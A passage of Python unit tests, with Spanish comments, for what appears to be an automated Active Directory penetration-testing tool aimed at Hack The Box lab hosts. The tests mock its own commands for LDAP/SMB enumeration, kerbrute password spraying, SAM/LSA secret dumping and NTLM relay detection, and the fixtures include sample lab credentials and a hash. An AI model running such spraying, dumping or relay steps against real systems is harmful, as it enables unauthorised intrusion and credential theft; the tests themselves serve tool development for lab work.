    # 'user-desc') se lanza de verdad tras un bind anónimo, no solo se sugiere. Formato de
    # salida sin confirmar contra un run real → regex genérico de "esto podría ser una
    # contraseña" (_SPIDER_SECRET_REGEX, el mismo que ya usa el spider de contenido).
    _real_nxc_bin5, _real_rc5 = nxc_bin, run_capture
    globals()["nxc_bin"] = lambda: "FAKE_NXC"

    def _fake_ldap_rc(cmd, timeout=None, **kw):
        if "-M" in cmd and "get-desc-users" in cmd:
            return 0, "LDAP 10.0.0.1 389 DC [+] User: svc_backup Desc: Password: B4ckup2024!"
        if cmd[1] == "ldap" and cmd[-1] == "--pass-pol":
            return 0, ("LDAP 10.0.0.1 389 DC [+] Dumping password info for domain: DOM\n"
                       "LDAP 10.0.0.1 389 DC  Minimum password length: 8\n"
                       "LDAP 10.0.0.1 389 DC     Domain Password Complex: 1\n"
                       "LDAP 10.0.0.1 389 DC  Account Lockout Threshold: 5")
        if cmd[1] == "ldap" and cmd[-1] in ("--users", "--groups"):
            return 0, "ok"
        return 0, "LDAP 10.0.0.1 389 DC [+] dom\\: (null auth)"   # nxc_auth: bind anónimo entra
    globals()["run_capture"] = _fake_ldap_rc
    try:
        _lsvc = [{"port": 389, "name": "ldap", "scripts": {}}]
        _lres = fp_ldap("10.0.0.1", _lsvc, _lsvc, {}, False)
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin5, _real_rc5
    assert any("get-desc-users" in s["cmd"] for s in _lres["steps"])        # se ejecutó de verdad, no solo se sugirió
    assert any(s == "alta" and "get-desc-users" in t for s, t in _lres["findings"])
    # --pass-pol por LDAP (bind anónimo): el mismo resumen 'info' que por SMB, aunque el lockout
    # sea normal (no solo cuando es None/0 — ver _format_pass_pol_finding).
    assert any(s == "info" and "política de contraseñas" in t and "longitud mínima 8" in t
               for s, t in _lres["findings"])

    # _parse_nxc_userlist: 1er token de cada fila de 'nxc --users', sin banner/cabecera/$ (equipos)
    _users_out = ("SMB  10.0.0.1 445 DC01  [*] Windows 10 (name:DC01) (Null Auth:True)\n"
                  "SMB  10.0.0.1 445 DC01  [+] dom\\wwhite:*** \n"
                  "SMB  10.0.0.1 445 DC01  -Username-                    -Last PW Set- -BadPW- -Description-\n"
                  "SMB  10.0.0.1 445 DC01  Administrator                 2025-04-28 14 Built-in admin\n"
                  "SMB  10.0.0.1 445 DC01  jpinkman                      2025-04-28 0\n"
                  "SMB  10.0.0.1 445 DC01  DC01$                         2025-04-28 0\n"
                  "SMB  10.0.0.1 445 DC01  [*] Enumerated 3 local users: DOM")
    assert _parse_nxc_userlist(_users_out) == ["Administrator", "jpinkman"]   # sin $ (equipo), sin cabecera/estado
    # _surface_ad_enum: usuarios + 'sin bloqueo' como hallazgo, deduplicado (users y rid-brute no duplican)
    _ad = _fp("reuse", "x", [445])
    _surface_ad_enum(_ad, "wwhite", "--users", _users_out)
    _surface_ad_enum(_ad, "wwhite", "--rid-brute",
                     "SMB x 445 DC  500: DOM\\Administrator (SidTypeUser)\nSMB x 445 DC  1106: DOM\\jpinkman (SidTypeUser)\nSMB x 445 DC  1002: DOM\\DC01$ (SidTypeUser)")
    assert sum("usuarios del dominio" in t for _, t in _ad["findings"]) == 1   # 1 sola vez pese a users + rid-brute
    _surface_ad_enum(_ad, "wwhite", "--pass-pol", "SMB x 445 DC  Account Lockout Threshold: None")
    assert any("sin bloqueo de cuentas" in t for _, t in _ad["findings"])

    # _parse_pass_pol / _format_pass_pol_finding: salida REAL de `nxc --pass-pol` contra un DC
    # con política NORMAL (lockout=5, no None/0) — pedido explícito: antes esto se leía (quedaba
    # en commands.log) pero NO generaba ningún hallazgo salvo que el lockout fuera débil, así que
    # la política descubierta no aparecía en el informe (ver htb/172.16.5.5/findings.json, un
    # run real contra INLANEFREIGHT.LOCAL, para el formato exacto).
    _ppol_out = (
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHT\n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  Minimum password length: 8\n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  Password history length: 24\n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  Maximum password age: Not Set\n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  Password Complexity Flags: 000001\n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01     Domain Password Complex: 1\n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes \n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes \n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  Locked Account Duration: 30 minutes \n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  Account Lockout Threshold: 5\n"
        "SMB  172.16.5.5  445  ACADEMY-EA-DC01  Forced Log off Time: Not Set")
    _ppol = _parse_pass_pol(_ppol_out)
    assert _ppol["min_len"] == "8" and _ppol["complex"] == "1" and _ppol["history"] == "24"
    assert _ppol["lockout_threshold"] == "5"
    _ppol_finding = _format_pass_pol_finding(_ppol)
    assert _ppol_finding.startswith("AD: política de contraseñas — ")
    assert "longitud mínima 8" in _ppol_finding and "complejidad activada" in _ppol_finding
    assert "bloqueo tras 5 intentos" in _ppol_finding and "30 minutes" in _ppol_finding
    assert "SIN bloqueo" not in _ppol_finding   # hay lockout de verdad: no es el caso "sin bloqueo"
    # con credencial: mismo resumen, con el prefijo "AD (cred user)" (igual que el resto de
    # hallazgos de _surface_ad_enum, p. ej. "AD (cred wwhite): N usuarios…")
    assert _format_pass_pol_finding(_ppol, prefix="AD (cred wwhite)").startswith(
        "AD (cred wwhite): política de contraseñas — ")
    # lockout None/0: el resumen lo marca explícitamente, sin inventar un umbral que no existe
    _ppol_none = _parse_pass_pol("SMB x 445 DC  Account Lockout Threshold: None")
    assert _format_pass_pol_finding(_ppol_none) == "AD: política de contraseñas — SIN bloqueo de cuentas"
    assert _format_pass_pol_finding({}) is None   # sin datos reconocibles (acceso denegado): no inventa nada
    # _parse_rpcclient_dompwinfo: fallback SIN nxc/netexec (HTB Academy, "Obtaining the Password
    # Policy using rpcclient") — solo longitud mínima + complejidad, es todo lo que da el comando.
    _dompw_out = "min_password_length: 8\npassword_properties: 0x00000001\n    DOMAIN_PASSWORD_COMPLEX"
    _dompw = _parse_rpcclient_dompwinfo(_dompw_out)
    assert _dompw == {"min_len": "8", "complex": "1"}
    assert _format_pass_pol_finding(_dompw) == "AD: política de contraseñas — longitud mínima 8, complejidad activada"
    assert _parse_rpcclient_dompwinfo("") == {}   # acceso denegado: rpcclient no imprime nada reconocible

    # Grupos de dominio por sesión nula (rpcclient enumdomgroups + querygroupmem + resolución de
    # RIDs). Fixture con el formato real de un DC de HTB (INLANEFREIGHT): usuarios y grupos en la
    # MISMA salida compuesta, incluido el grupo personalizado 'Interns' (RID 0xff0 >= 1000).
    _rpc_comp = ("user:[administrator] rid:[0x1f4]\nuser:[htb-student] rid:[0x457]\n"
                 "group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\n"
                 "group:[Domain Admins] rid:[0x200]\ngroup:[Interns] rid:[0xff0]\n")
    assert _parse_rpcclient_groups(_rpc_comp) == [
        ("Enterprise Read-only Domain Controllers", "0x1f2"),
        ("Domain Admins", "0x200"), ("Interns", "0xff0")]
    assert _parse_rpcclient_groups("") == []
    assert _parse_rpcclient_group_members("\trid:[0x1f4] attr:[0x7]\n\trid:[0x457] attr:[0x7]\n") == ["0x1f4", "0x457"]
    assert _parse_rpcclient_group_members("") == []
    _rid_map = _rpc_rid_name_map(_rpc_comp)
    assert _rid_map["0x1f4"] == "administrator" and _rid_map["0x200"] == "Domain Admins"
    # _rpc_enum_groups: Domain Admins (RID admin) → miembros resueltos a nombre con severidad 'alta';
    # Interns (custom) → 'info'; RIDs de miembros que no estén en el mapa se muestran como 'RID 0x..'.
    # querygroupmem se mockea por RID; enumdomgroups ya viene en composite_out (no se vuelve a pedir).
    _real_rc_rpc = run_capture

    def _fake_rpc_gm(cmd, timeout=None, **kw):
        c = " ".join(cmd)
        if "querygroupmem 0x200" in c:
            return 0, "\trid:[0x1f4] attr:[0x7]\n"                               # administrator (en el mapa)
        if "querygroupmem 0xff0" in c:
            return 0, "\trid:[0x771] attr:[0x7]\n\trid:[0x772] attr:[0x7]\n"     # RIDs NO en el mapa
        return 0, ""
    globals()["run_capture"] = _fake_rpc_gm
    try:
        _rpcg = _fp("smb", "x", [445])
        _rpc_enum_groups(_rpcg, "10.0.0.1", _rpc_comp)
    finally:
        globals()["run_capture"] = _real_rc_rpc
    _rpcg_f = {(s, t) for s, t in _rpcg["findings"]}
    assert any(s == "info" and "3 grupos de dominio" in t and "Interns" in t for s, t in _rpcg_f)
    assert any(s == "alta" and "Domain Admins" in t and "ADMINS DEL DOMINIO" in t and "administrator" in t for s, t in _rpcg_f)
    assert any(s == "info" and "'Interns'" in t and "2 miembro(s)" in t and "RID 0x771" in t for s, t in _rpcg_f)
    _rpcg2 = _fp("smb", "x", [445])
    _rpc_enum_groups(_rpcg2, "10.0.0.1", "nada reconocible\n")   # sin grupos (RestrictAnonymous): no hace nada
    assert _rpcg2["findings"] == [] and _rpcg2["steps"] == []

    # _parse_nxc_group_members: nxc ldap --groups "Grupo" imprime SOLO los miembros (uno por línea,
    # tras el prefijo 'PROTO ip puerto host'); descarta estado [*]/[+]/[-] y 'not found'.
    _grp_out = ("LDAP 10.0.0.1 389 DC01 [*] Enumerating members\n"
                "LDAP 10.0.0.1 389 DC01 administrator\nLDAP 10.0.0.1 389 DC01 lab_adm\n")
    assert _parse_nxc_group_members(_grp_out) == ["administrator", "lab_adm"]
    assert _parse_nxc_group_members("LDAP 10.0.0.1 389 DC01 [-] Group 'X' not found\n") == []
    assert _parse_nxc_group_members("") == []

    # _parse_loggedon_users: 'DOMINIO\\usuario' de `nxc smb --loggedon-users` (relleno a 25 +
    # 'logon_server: SERVIDOR'); el error de bajo privilegio no casa (no hay usuarios).
    _lou = ("SMB 10.0.0.1 445 DC01 INLANEFREIGHT\\administrator           logon_server: DC01\n"
            "SMB 10.0.0.1 445 DC01 INLANEFREIGHT\\svc_sql                 logon_server: DC01\n")
    assert _parse_loggedon_users(_lou) == ["INLANEFREIGHT\\administrator", "INLANEFREIGHT\\svc_sql"]
    assert _parse_loggedon_users("SMB 10.0.0.1 445 DC01 [-] Error enumerating logged on users") == []
    assert _parse_loggedon_users("") == []

    # _parse_kerbrute_spray: usuario de cada '[+] VALID LOGIN: user@dom:pass' (tolera color ANSI).
    _spray_out = ("2026/01/01 12:00:00 >  [+] VALID LOGIN:\t administrator@inlanefreight.local:Welcome1\n"
                  "2026/01/01 12:00:01 >  [+] VALID LOGIN:\t svc_sql@inlanefreight.local:Welcome1\n"
                  "\x1b[32m2026/01/01 12:00:02 >  [+] VALID LOGIN:\t bob@inlanefreight.local:Welcome1\x1b[0m\n")
    assert _parse_kerbrute_spray(_spray_out) == ["administrator", "svc_sql", "bob"]
    assert _parse_kerbrute_spray("Done! Tested 56 logins (0 successes)") == []
    assert _parse_kerbrute_spray("") == []

    # _read_ad_users: lee <base>/ad_users.txt (ignora líneas vacías); [] sin fichero o base None.
    _ad_dir = Path(tempfile.mkdtemp())
    (_ad_dir / "ad_users.txt").write_text("administrator\njon\n\nsvc_sql\n")
    assert _read_ad_users(_ad_dir) == ["administrator", "jon", "svc_sql"]
    assert _read_ad_users(Path(tempfile.mkdtemp())) == []
    assert _read_ad_users(None) == []

    # _spray_phase: rocía ad_users.txt con kerbrute passwordspray --safe; un acierto → hallazgo
    # crítico y la contraseña ENMASCARADA (***) en el paso guardado. kerbrute/run_capture mockeados.
    _real_kbbin_s, _real_rc_s = _kerbrute_bin, run_capture
    _spray_dir = Path(tempfile.mkdtemp())
    (_spray_dir / "ad_users.txt").write_text("administrator\njon\n")
    globals()["_kerbrute_bin"] = lambda: "FAKE_KB"

    def _fake_spray_rc(cmd, timeout=None, **kw):
        if cmd and "passwordspray" in cmd:
            return 0, "[+] VALID LOGIN:\t jon@inlanefreight.local:Welcome1\nDone! Tested 2 logins (1 successes)\n"
        return 0, ""
    globals()["run_capture"] = _fake_spray_rc
    _real_spray_pw = globals()["SPRAY_PASSWORDS"]
    globals()["SPRAY_PASSWORDS"] = ["Welcome1"]
    try:
        _dc_services = [{"port": 88, "name": "kerberos-sec"}, {"port": 445, "name": "microsoft-ds"}, {"port": 389, "name": "ldap"}]
        _sp = _spray_phase("10.0.0.1", "inlanefreight.local", _spray_dir, _dc_services)
        _sp_nodc = _spray_phase("10.0.0.1", "inlanefreight.local", _spray_dir, [{"port": 80, "name": "http"}])
    finally:
        globals()["_kerbrute_bin"], globals()["run_capture"] = _real_kbbin_s, _real_rc_s
        globals()["SPRAY_PASSWORDS"] = _real_spray_pw
    assert _sp is not None
    assert any(s == "critica" and "VÁLIDA" in t and "jon" in t for s, t in _sp["findings"])
    assert "Welcome1" not in _sp["steps"][0]["output"] and "***" in _sp["steps"][0]["cmd"]
    assert _sp_nodc is None   # spraying por Kerberos solo contra un DC

    # _parse_nxc_signing: banner de nxc smb, formato real confirmado contra un run (ver
    # fixtures de arriba, línea con '(signing:False) (SMBv1:None)'). True/False/None.
    assert _parse_nxc_signing(
        "SMB 10.0.0.1 445 DC01 [*] Windows 10 (name:DC01) (domain:X) (signing:True) (SMBv1:False)") is True
    assert _parse_nxc_signing(
        "SMB 10.129.4.104 445 FRONTDESK01 [*] Windows 10 (name:FRONTDESK01) (domain:FrontDesk01) (signing:False) (SMBv1:None)") is False
    assert _parse_nxc_signing("") is None
    assert _parse_nxc_signing("sin el patrón esperado") is None

    # fp_smb: signing no requerido → hallazgo 'media' + metadata interna '_signing_disabled' (la
    # consume footprint_services, no se muestra). Con signing:True, nada de esto aparece.
    _real_nxcbin_sg, _real_rc_sg = nxc_bin, run_capture
    globals()["nxc_bin"] = lambda: "FAKE_NXC"

    def _fake_sg_rc(cmd, timeout=None, **kw):
        if cmd[0] == "rpcclient":
            return 1, ""
        return 0, "SMB 10.0.0.1 445 DC01 [*] Windows 10 (name:DC01) (domain:X) (signing:False) (SMBv1:None)"
    globals()["run_capture"] = _fake_sg_rc
    try:
        _sgres = fp_smb("10.0.0.1", [{"port": 445}], [{"port": 445, "name": "smb", "scripts": {}}], {}, False)
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxcbin_sg, _real_rc_sg
    assert any(s == "media" and "signing NO requerido" in t for s, t in _sgres["findings"])
    assert _sgres["_signing_disabled"] is True

    def _fake_sg_rc_true(cmd, timeout=None, **kw):
        if cmd[0] == "rpcclient":
            return 1, ""
        return 0, "SMB 10.0.0.1 445 DC01 [*] Windows 10 (name:DC01) (domain:X) (signing:True) (SMBv1:None)"
    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_sg_rc_true
    try:
        _sgres2 = fp_smb("10.0.0.1", [{"port": 445}], [{"port": 445, "name": "smb", "scripts": {}}], {}, False)
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxcbin_sg, _real_rc_sg
    assert not any("signing NO requerido" in t for _s, t in _sgres2["findings"])
    assert "_signing_disabled" not in _sgres2

    # fp_msrpc: guarda '_coerce'/'_coerce_via' como metadata interna (consumida por
    # footprint_services) además de los findings de PrinterBug/PetitPotam que ya emitía.
    assert _mres["_coerce"] is True and "MS-RPRN" in _mres["_coerce_via"]    # _mres: fixture existente arriba (spooler+EFSR)
    assert _mres2["_coerce"] is True and _mres2["_coerce_via"] == "MS-EFSR"  # _mres2: fixture existente, solo EFSR
    _real_nxcbin_mc, _real_rpcdumpbin_mc, _real_rc_mc = nxc_bin, globals()["_rpcdump_bin"], run_capture
    globals()["nxc_bin"], globals()["_rpcdump_bin"] = (lambda: None), (lambda: "FAKE_RPCDUMP")
    globals()["run_capture"] = lambda cmd, timeout=None, **kw: (0, "Protocol: [MS-SCMR]: nada de coacción aquí")
    try:
        _mres3 = fp_msrpc("10.0.0.1", _msvc, _msvc, {}, False)
    finally:
        globals()["nxc_bin"], globals()["_rpcdump_bin"], globals()["run_capture"] = \
            _real_nxcbin_mc, _real_rpcdumpbin_mc, _real_rc_mc
    assert _mres3["_coerce"] is False and _mres3["_coerce_via"] == ""        # ni MS-RPRN/PAR ni MS-EFSR: sin coacción

    # _combine_relay_opportunity: combina _signing_disabled (smb) + _coerce (msrpc) del MISMO
    # host en un hallazgo 'critica' de relay reflexivo cuando los DOS aparecen — se llama en
    # run_one (tras los rellenos de placeholder DOMINIO/NETBIOS-DEL-DC), no dentro de
    # footprint_services, precisamente para que funcione igual tras --resume (ver su docstring).
    # SIEMPRE limpia la metadata interna, aparezca la combinación o no.
    _fs_smb = _fp("smb", "SMB / RPC", [445])
    _fs_smb["_signing_disabled"] = True
    _fs_rpc = _fp("msrpc", "MSRPC / WMI", [135])
    _fs_rpc["_coerce"], _fs_rpc["_coerce_via"] = True, "MS-EFSR"
    _combine_relay_opportunity([_fs_smb, _fs_rpc], "10.0.0.1")
    assert any(s == "critica" and "relay REFLEXIVO" in t and "MS-EFSR" in t for s, t in _fs_smb["findings"])
    assert any("ntlmrelayx.py -t smb://10.0.0.1" in n for n in _fs_smb["next"])
    assert "_signing_disabled" not in _fs_smb and "_coerce" not in _fs_rpc and "_coerce_via" not in _fs_rpc
    # Solo signing, sin coacción → ningún hallazgo nuevo (pero SÍ limpia la metadata).
    _fs_smb2 = _fp("smb", "SMB / RPC", [445]); _fs_smb2["_signing_disabled"] = True
    _fs_rpc2 = _fp("msrpc", "MSRPC / WMI", [135]); _fs_rpc2["_coerce"] = False
    _combine_relay_opportunity([_fs_smb2, _fs_rpc2], "10.0.0.1")
    assert not any("relay REFLEXIVO" in t for _s, t in _fs_smb2["findings"])
    assert "_signing_disabled" not in _fs_smb2 and "_coerce" not in _fs_rpc2
    # Sin footprint msrpc en absoluto (ni siquiera se detectó el puerto 135) → no debe petar.
    _fs_smb3 = _fp("smb", "SMB / RPC", [445]); _fs_smb3["_signing_disabled"] = True
    _combine_relay_opportunity([_fs_smb3], "10.0.0.1")
    assert not any("relay REFLEXIVO" in t for _s, t in _fs_smb3["findings"])
    assert "_signing_disabled" not in _fs_smb3

    # _parse_maq / _maq_finding: 'MachineAccountQuota: N' de nxc -M maq (confirmado en su código
    # fuente). MAQ>0 → 'alta' (precondición de noPac/RBCD); MAQ=0 → 'info' (endurecido); sin dato → None.
    assert _parse_maq("MachineAccountQuota: 10") == 10
    assert _parse_maq("MachineAccountQuota: 0") == 0
    assert _parse_maq("") is None
    assert _parse_maq("sin el patrón") is None
    _maq10 = _maq_finding(10, prefix="AD")
    assert _maq10[0] == "alta" and "MachineAccountQuota = 10" in _maq10[1] and "noPac" in _maq10[1]
    _maq0 = _maq_finding(0, prefix="AD")
    assert _maq0[0] == "info" and "MachineAccountQuota = 0" in _maq0[1]
    assert _maq_finding(None) is None

    # _parse_ldap_trusts: formato LDIF de ldapsearch (bloques separados por línea en blanco).
    # Un trust bidireccional forest-transitive (0x8|0x20=0x28=40) y otro entrante no-transitivo (0x1).
    _trust_ldif = (
        "dn: CN=otherforest.local,CN=System,DC=inlanefreight,DC=local\n"
        "trustPartner: otherforest.local\n"
        "trustDirection: 3\n"
        "trustType: 2\n"
        "trustAttributes: 40\n"
        "\n"
        "dn: CN=legacy.local,CN=System,DC=inlanefreight,DC=local\n"
        "trustPartner: legacy.local\n"
        "trustDirection: 1\n"
        "trustType: 1\n"
        "trustAttributes: 1\n")
    _trusts = _parse_ldap_trusts(_trust_ldif)
    assert len(_trusts) == 2
    assert _trusts[0] == {"partner": "otherforest.local", "direction": "bidireccional",
                          "type": "Active Directory", "forest_transitive": True}
    assert _trusts[1] == {"partner": "legacy.local", "direction": "entrante",
                          "type": "Windows NT", "forest_transitive": False}
    assert _parse_ldap_trusts("") == []
    assert _parse_ldap_trusts("sin trustPartner aquí") == []

    # fp_ldap: trusts anónimos vía ldapsearch (mismo base DN que namingContexts, sin llamada
    # de red extra de peso) — y MAQ anónimo (-M maq) cuando --users ya demostró lectura real.
    _real_have_ld, _real_rc_ld, _real_nxcbin_ld = globals()["have"], run_capture, nxc_bin
    globals()["have"] = lambda name: name in ("ldapsearch",)   # sin nxc: fuerza la rama ldapsearch
    globals()["nxc_bin"] = lambda: None

    def _fake_ld_rc(cmd, timeout=None, **kw):
        if cmd[0] == "ldapsearch" and "namingContexts" in cmd:
            return 0, "namingContexts: DC=inlanefreight,DC=local"
        if cmd[0] == "ldapsearch" and "(objectClass=trustedDomain)" in cmd:
            return 0, _trust_ldif
        return 0, ""
    globals()["run_capture"] = _fake_ld_rc
    try:
        _ldres = fp_ldap("10.0.0.1", [{"port": 389}], [{"port": 389, "name": "ldap", "scripts": {}}], {}, False)
    finally:
        globals()["have"], globals()["run_capture"], globals()["nxc_bin"] = _real_have_ld, _real_rc_ld, _real_nxcbin_ld
    assert any(s == "info" and "trust con 'otherforest.local'" in t and "TODO el bosque" in t for s, t in _ldres["findings"])
    assert any(s == "info" and "trust con 'legacy.local'" in t and "solo este dominio" in t for s, t in _ldres["findings"])

    # _creds_enum (ldap, autenticado): MAQ y trusts también con una credencial ya validada —
    # trusts por ldapsearch con bind simple (-D user@domain -y FICHERO, NUNCA la contraseña en
    # argv) ya que nxc no tiene '--trusts'; MAQ por 'nxc -M maq' como en el camino anónimo.
    _real_rc_ce, _real_certipy_ce, _real_have_ce = run_capture, globals().get("certipy_bin"), globals()["have"]
    globals()["certipy_bin"] = lambda: None   # sin certipy instalado: ese bloque se salta limpio
    globals()["have"] = lambda name: name in ("ldapsearch",)

    def _fake_ce_rc(cmd, timeout=None, quiet=False, **kw):
        if cmd[0] == "ldapsearch":
            assert "-D" in cmd and f"{cmd[cmd.index('-D') + 1]}" == "jon@inlanefreight.local"
            assert "-y" in cmd and "Welcome1" not in " ".join(cmd)   # el secreto NUNCA en argv (va por fichero)
            return 0, _trust_ldif
        if "-M" in cmd and "maq" in cmd:
            return 0, "MachineAccountQuota: 5"
        return 0, "LDAP 10.0.0.1 389 DC01 [*] ok"
    globals()["run_capture"] = _fake_ce_rc
    _ceres = _fp("reuse-ldap", "x", [389])
    try:
        _creds_enum(_ceres, "FAKE_NXC", "ldap", "10.0.0.1", "jon", "Welcome1", False, False, True,
                   389, 389, None, domain="inlanefreight.local")
    finally:
        globals()["run_capture"], globals()["certipy_bin"], globals()["have"] = _real_rc_ce, _real_certipy_ce, _real_have_ce
    assert any(s == "alta" and "MachineAccountQuota = 5" in t and "jon" in t for s, t in _ceres["findings"])
    assert any(s == "info" and "trust con 'otherforest.local'" in t and "cred jon" in t for s, t in _ceres["findings"])

    # _smb_ad_enum: con la MISMA salida real de arriba, --pass-pol ahora también sale como
    # hallazgo 'info' (antes solo se leía en commands.log salvo lockout None/0).
    _real_rc_smbad = run_capture

    def _fake_smbad_rc(cmd, timeout=None, **kw):
        return (0, _ppol_out) if cmd[-1] == "--pass-pol" else (0, "SMB x 445 DC  [*] ok")
    globals()["run_capture"] = _fake_smbad_rc
    try:
        _smbad_res = _fp("reuse", "x", [445])
        _smb_ad_enum(_smbad_res, "FAKE_NXC", "10.0.0.1", auth_user="", anon_readable=True)
    finally:
        globals()["run_capture"] = _real_rc_smbad
    assert any(s == "info" and "política de contraseñas" in t and "longitud mínima 8" in t
               for s, t in _smbad_res["findings"])
    assert not any(s == "media" and "sin bloqueo" in t for s, t in _smbad_res["findings"])   # lockout=5: no es el caso débil

    # fp_smb SIN nxc/netexec instalado: 'getdompwinfo' (añadido a la cadena de rpcclient) es el
    # único fallback de política de contraseñas por sesión nula — antes, sin nxc, fp_smb no
    # sacaba pass-pol en absoluto (HTB Academy, "Obtaining the Password Policy using rpcclient").
    _real_nxcbin7, _real_have7, _real_rc7 = nxc_bin, globals()["have"], run_capture
    globals()["nxc_bin"] = lambda: None
    globals()["have"] = lambda name: name == "rpcclient"   # sin smbclient: menos ruido en este test

    def _fake_smb_norpc_rc(cmd, timeout=None, **kw):
        if cmd and cmd[0] == "rpcclient":
            return 0, "srvinfo ok\n" + _dompw_out
        raise AssertionError(f"comando inesperado (nxc no debería lanzarse sin nxc_bin): {cmd}")
    globals()["run_capture"] = _fake_smb_norpc_rc
    try:
        _smb_nonxc = fp_smb("10.0.0.1", [{"port": 445}],
                            [{"port": 445, "name": "smb", "scripts": {}}], {}, False)
    finally:
        globals()["nxc_bin"], globals()["have"], globals()["run_capture"] = _real_nxcbin7, _real_have7, _real_rc7
    assert "getdompwinfo" in _smb_nonxc["steps"][0]["cmd"]
    assert any(s == "info" and "política de contraseñas" in t and "longitud mínima 8" in t
               for s, t in _smb_nonxc["findings"])

    # _surface_ad_enum CON 'seen' compartido: desde que la Fase 5d tiene un footprint-dict
    # POR PROTOCOLO (ver provided_creds_check), SMB y LDAP ya NO comparten 'res' — sin un
    # 'seen' común, el mismo hallazgo de AD se duplicaría (una vez en cada protocolo). Bug
    # real encontrado al agrupar el informe por protocolo: "AD (cred hwilliam): N usuarios…"
    # salía en SMB Y en LDAP a la vez contra el mismo DC.
    _ad_smb, _ad_ldap = _fp("reuse-smb", "x", [445]), _fp("reuse-ldap", "x", [389])
    _shared_seen = set()
    _surface_ad_enum(_ad_smb, "wwhite", "--users", _users_out, seen=_shared_seen)
    _surface_ad_enum(_ad_ldap, "wwhite", "--users", _users_out, seen=_shared_seen)
    assert sum("usuarios del dominio" in t for _, t in _ad_smb["findings"]) == 1
    assert sum("usuarios del dominio" in t for _, t in _ad_ldap["findings"]) == 0   # ya lo puso SMB: LDAP no lo repite

    # _dump_sam_lsa: mockeando nxc_bin/run_capture con esas MISMAS salidas reales, comprueba
    # que llama a 'nxc smb ip -u ... -p ... --sam' y '--lsa' (sin --local-auth: reutiliza
    # tal cual la autenticación que ya dio Pwn3d!), que la contraseña del operador queda
    # enmascarada en el output guardado pero el hash/secreto DESCUBIERTO no (es la entrega),
    # y que las severidades son las esperadas (cuenta con hash vacío y LSA en texto claro
    # → crítica; hash NTLM normal → alta).
    _real_nxc_bin3, _real_run_capture3 = nxc_bin, run_capture
    _dump_cmds = []

    def _fake_dump_run_capture(cmd, timeout=None, quiet=False, **kw):
        _dump_cmds.append(cmd)
        if "--sam" in cmd:
            return 0, _sam_out
        if "--lsa" in cmd:
            return 0, _lsa_out
        raise AssertionError(f"comando nxc inesperado en _dump_sam_lsa: {cmd}")

    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_run_capture
    try:
        _dres = _fp("reuse", "test", [445])
        _dump_sam_lsa(_dres, "FAKE_NXC", "10.129.4.104", "bob", "HTB_@cademy_stdnt!")
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
    assert len(_dump_cmds) == 2 and "--local-auth" not in _dump_cmds[0] and "--local-auth" not in _dump_cmds[1]
    assert all("HTB_@cademy_stdnt!" not in " ".join(c) for c in _dump_cmds)   # la contraseña nunca va en el argv
    _dsteps_out = " ".join(s["output"] for s in _dres["steps"])
    assert "HTB_@cademy_stdnt!" not in _dsteps_out   # la contraseña del operador, enmascarada
    assert "3c0e5d303ec84884ad5c3b7876a06ea6" in _dsteps_out and "Password123" in _dsteps_out   # el hash/secreto DESCUBIERTO, en claro (es la entrega)
    _dfindings = {(s, t) for s, t in _dres["findings"]}
    assert any(s == "critica" and "Administrator" in t and "VACÍA" in t for s, t in _dfindings)
    assert any(s == "alta" and "bob" in t and "3c0e5d303ec84884ad5c3b7876a06ea6" in t for s, t in _dfindings)
    assert any(s == "critica" and "frontdesk:Password123" in t for s, t in _dfindings)
    assert any(s == "alta" and "DPAPI" in t for s, t in _dfindings)

    # --local-auth (palantir): _dump_sam_lsa lo añade a AMBAS llamadas (--sam/--lsa) cuando
    # se pide explícitamente — reutiliza el mismo mock de arriba, _dump_cmds ya tiene los
    # 2 comandos SIN la flag; estos 2 nuevos van al final de la misma lista.
    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_run_capture
    try:
        _dres3 = _fp("reuse", "test", [445])
        _dump_sam_lsa(_dres3, "FAKE_NXC", "10.129.4.104", "bob", "HTB_@cademy_stdnt!", local_auth=True)
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
    assert "--local-auth" in _dump_cmds[-2] and "--local-auth" in _dump_cmds[-1]

    # _dump_sam_lsa con pool=: alimenta la retroalimentación con lo DESCUBIERTO (cred LSA en claro
    # 'frontdesk:Password123' + hash NTLM de SAM de 'bob' para pass-the-hash).
    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_run_capture
    _pool_t = []
    try:
        _dump_sam_lsa(_fp("reuse", "t", [445]), "FAKE_NXC", "10.129.4.104", "bob", "HTB_@cademy_stdnt!", pool=_pool_t)
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
    assert any(c["user"] == "frontdesk" and c["secret"] == "Password123" and not c["is_hash"] for c in _pool_t)
    assert any(c["is_hash"] and c["user"] == "bob" for c in _pool_t)
    # _pool_add deduplica
    _pp = []
    _pool_add(_pp, "a", "b", False); _pool_add(_pp, "a", "b", False); _pool_add(_pp, "a", "b", True)
    assert len(_pp) == 2 and not _pp[0]["is_hash"] and _pp[1]["is_hash"]

    # _reuse_chain: una credencial hallada en un servicio se reprueba en los demás; si abre uno
    # nuevo (smb/ldap) se enumera con ella (la retroalimentación). robin (ya hallado por ssh) →
    # válido por smb → hallazgo de reutilización + _creds_enum por smb.
    _rz_cmds = []

    def _fake_rz(cmd, timeout=None, quiet=False, **kw):
        _rz_cmds.append(cmd)
